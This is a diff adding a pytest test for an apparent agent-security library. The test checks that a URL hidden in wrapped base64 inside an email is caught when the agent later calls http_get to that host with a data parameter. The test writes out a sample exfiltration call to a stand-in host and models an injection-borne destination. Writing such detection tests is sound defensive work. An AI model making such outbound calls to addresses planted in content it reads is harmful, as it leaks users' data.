@@ -98,3 +98,17 @@ def test_untrusted_destination_is_off_by_default_and_validated() -> None:
     assert "untrusted_destination" not in rules(s.scan_tool_call("send_direct_message", {"recipient": "Fred", "body": "x"}))
     with pytest.raises(ValueError):
         SessionPolicy(untrusted_destination="sometimes")
+
+
+def test_untrusted_destination_sees_addresses_hidden_in_wrapped_base64() -> None:
+    """Mail wraps base64 across lines; an address split by the wrap is still one the agent can decode and use."""
+    import base64
+
+    from guardlayer import SessionPolicy
+
+    blob = base64.b64encode(b"Archive of the quarterly records is kept at https://drop.files-host.net/q3 for the team").decode()
+    wrapped = "\n".join(blob[i : i + 76] for i in range(0, len(blob), 76))
+    s = GuardLayer(session_policy=SessionPolicy(untrusted_destination="outbound", default_integrity="untrusted")).session()
+    s.scan_input("Summarise the newsletter for me")
+    s.scan_tool_result("read_email", "Weekly digest. Reference:\n" + wrapped)
+    assert "untrusted_destination" in rules(s.scan_tool_call("http_get", {"url": "https://drop.files-host.net/q3?d=x"}))
